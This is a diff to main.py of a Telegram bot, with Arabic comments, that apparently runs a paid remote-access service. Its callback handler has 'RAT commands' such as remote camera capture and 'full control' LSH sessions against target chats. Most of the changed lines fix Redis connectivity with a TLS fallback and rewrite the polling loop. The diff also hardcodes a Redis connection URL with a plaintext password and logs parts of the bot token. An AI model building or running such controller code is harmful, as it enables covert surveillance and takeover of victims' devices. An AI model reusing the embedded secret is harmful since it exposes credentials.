@@ -1,6 +1,7 @@
 # main.py
 import os
 import io
+import time
 import threading
 import requests
 import telebot
@@ -85,6 +86,7 @@ try:
         AVAILABLE_TOOLS,
     )
     PAYMENT_ENABLED = True
+    print("[+] stars_payment imported")
 except Exception as e:
     print(f"[-] Error importing stars_payment: {e}")
     PAYMENT_ENABLED = False
@@ -109,22 +111,73 @@ except Exception as e:
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 RAILWAY_URL = os.getenv("RAILWAY_URL", "https://daf-production-8df9.up.railway.app")
 
-REDIS_URL = os.getenv("REDIS_URL", "redis://localhost:6379").strip()
-if REDIS_URL.startswith("redis-cli"):
-    REDIS_URL = REDIS_URL.split(" -u ")[-1].strip()
-if not REDIS_URL.startswith(("redis://", "rediss://", "unix://")):
+# ============================================================
+# Redis — نسخة محسّنة مع TLS fallback
+# ============================================================
+REDIS_URL = os.getenv("REDIS_URL", "").strip()
+
+# إذا لم يكن موجوداً، استخدم الافتراضي
+if not REDIS_URL:
     REDIS_URL = "redis://default:aF4GQMQw6l9ZEpZjfThV2koySkuFbk9c@insect-outsize-shirt-48022.db.redis.io:15744"
 
-try:
-    redis_client = redis.Redis.from_url(REDIS_URL, decode_responses=True)
-    redis_client.ping()
-    print("[+] main: Redis connected")
-except Exception as e:
-    print(f"[-] Critical Redis Connection Error: {e}")
-    redis_client = None
+# تنظيف الرابط
+if REDIS_URL.startswith("redis-cli"):
+    REDIS_URL = REDIS_URL.split(" -u ")[-1].strip()
+
+# إضافة scheme إذا كان مفقوداً
+if not REDIS_URL.startswith(("redis://", "rediss://", "unix://")):
+    REDIS_URL = "redis://" + REDIS_URL
+
+print(f"[+] Redis URL configured: {REDIS_URL[:45]}...")
+
+
+def _try_redis(url):
+    """محاولة اتصال Redis مع ping"""
+    try:
+        client = redis.Redis.from_url(
+            url,
+            decode_responses=True,
+            socket_timeout=10,
+            socket_connect_timeout=10,
+            retry_on_timeout=True,
+            health_check_interval=30,
+        )
+        client.ping()
+        return client
+    except Exception as e:
+        print(f"[-] Redis try failed ({url[:30]}...): {e}")
+        return None
+
+
+redis_client = _try_redis(REDIS_URL)
+
+# إذا فشل، جرّب TLS
+if not redis_client and REDIS_URL.startswith("redis://"):
+    tls_url = REDIS_URL.replace("redis://", "rediss://", 1)
+    print(f"[+] Trying TLS fallback...")
+    redis_client = _try_redis(tls_url)
+    if redis_client:
+        REDIS_URL = tls_url
+        print("[+] TLS connection succeeded!")
+
+# إذا فشل، جرّب بدون TLS
+if not redis_client and REDIS_URL.startswith("rediss://"):
+    non_tls = REDIS_URL.replace("rediss://", "redis://", 1)
+    print(f"[+] Trying non-TLS fallback...")
+    redis_client = _try_redis(non_tls)
+    if redis_client:
+        REDIS_URL = non_tls
+        print("[+] Non-TLS connection succeeded!")
+
+if redis_client:
+    print("[+] main: Redis connected successfully")
+else:
+    print("[-] main: Redis FAILED — some features may not work")
 
 if not BOT_TOKEN:
     raise ValueError("[-] BOT_TOKEN is missing!")
+
+print(f"[+] Bot token configured: {BOT_TOKEN[:10]}...")
 
 bot = telebot.TeleBot(BOT_TOKEN)
 app = Flask(__name__)
@@ -206,6 +259,7 @@ def _deny_message(reason, user_id, tool, data=None):
 # ============================================================
 @bot.message_handler(commands=['start', 'panel'])
 def start_command(message):
+    print(f"[+] /start from {message.from_user.id}")
     user_name = message.from_user.first_name
     get_or_create_user(
         message.from_user.id,
@@ -364,7 +418,7 @@ def callback_handler(call):
         consume_usage(chat_id, "lsh")
         bot.answer_callback_query(call.id, "جاري تجهيز جلسة التحكم الكامل...")
 
-        # إنشاء الجلسة محلياً مباشرة (بدون HTTP)
+        # إنشاء الجلسة محلياً
         session_id = str(uuid.uuid4()).replace('-', '')[:24]
         if redis_client:
             try:
@@ -372,7 +426,7 @@ def callback_handler(call):
             except Exception as e:
                 print(f"[-] Redis setex LSH error: {e}")
 
-        # محاولة إنشاء جلسة في الذاكرة أيضاً عبر HTTP (اختياري)
+        # إعلام lsh_module (اختياري)
         try:
             requests.post(
                 f"{RAILWAY_URL}/lsh_create",
@@ -420,7 +474,7 @@ def callback_handler(call):
         return
 
     # ============================================================
-    # أوامر RAT (لا تستهلك رصيداً)
+    # أوامر RAT
     # ============================================================
     if call.data.startswith("rat_cam_"):
         target_chat_id = call.data.replace("rat_cam_", "")
@@ -435,7 +489,7 @@ def callback_handler(call):
         return
 
     # ============================================================
-    # أوامر LSH — الأسماء الجديدة المطابقة لـ lsh_module.py
+    # أوامر LSH
     # ============================================================
     if call.data.startswith("lsh_snap_"):
         sid = call.data.replace("lsh_snap_", "")
@@ -531,25 +585,71 @@ def handle_open_url(message):
 
 
 # ============================================================
-# تشغيل البوت
+# ★★★ تشغيل البوت — النسخة المُصلحة والمضمونة ★★★
 # ============================================================
 def run_telegram_bot():
-    print("[+] Starting Telegram Bot polling in background thread...")
-    try:
-        bot.delete_webhook(drop_pending_updates=True)
-        print("[+] Old webhook deleted, polling mode active")
-    except Exception as e:
-        print(f"[-] delete_webhook warning: {e}")
+    print("[+] ============================================")
+    print("[+] Starting Telegram Bot polling...")
+    print(f"[+] Bot token: {BOT_TOKEN[:15]}...{BOT_TOKEN[-5:]}")
+    print("[+] ============================================")
 
+    # 1) احذف الـ Webhook عبر HTTP مباشر (أسرع من telebot)
     try:
-        bot.infinity_polling(skip_pending=True, timeout=30, long_polling_timeout=30)
+        r = requests.get(
+            f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook",
+            params={"drop_pending_updates": "true"},
+            timeout=15,
+        )
+        print(f"[+] deleteWebhook HTTP {r.status_code}: {r.text[:200]}")
     except Exception as e:
-        print(f"[-] Telegram Polling Error: {e}")
+        print(f"[-] deleteWebhook HTTP error: {e}")
+
+    # 2) تحقق من حالة Webhook
+    try:
+        r = requests.get(
+            f"https://api.telegram.org/bot{BOT_TOKEN}/getWebhookInfo",
+            timeout=15,
+        )
+        print(f"[+] getWebhookInfo: {r.text[:300]}")
+    except Exception as e:
+        print(f"[-] getWebhookInfo error: {e}")
+
+    # 3) تحقق من getMe (البوت يعمل؟)
+    try:
+        r = requests.get(
+            f"https://api.telegram.org/bot{BOT_TOKEN}/getMe",
+            timeout=15,
+        )
+        print(f"[+] getMe: {r.text[:200]}")
+    except Exception as e:
+        print(f"[-] getMe error: {e}")
+
+    # 4) ابدأ polling في حلقة لا نهائية
+    print("[+] Starting infinity_polling loop...")
+    attempt = 0
+    while True:
+        try:
+            attempt += 1
+            print(f"[+] Polling attempt #{attempt}")
+            bot.infinity_polling(
+                skip_pending=True,
+                timeout=30,
+                long_polling_timeout=30,
+                none_stop=True,
+            )
+        except Exception as e:
+            print(f"[-] Polling crashed: {e}")
+            print(f"[+] Restarting in 5 seconds...")
+            time.sleep(5)
 
 
 if __name__ == "__main__":
+    # شغّل البوت في thread منفصل
     bot_thread = threading.Thread(target=run_telegram_bot, daemon=True)
     bot_thread.start()
+
+    # انتظر ثانيتين حتى يبدأ البوت
+    time.sleep(2)
 
     port = int(os.environ.get("PORT", 8080))
     print(f"[+] Flask Web Server starting on port {port}...")
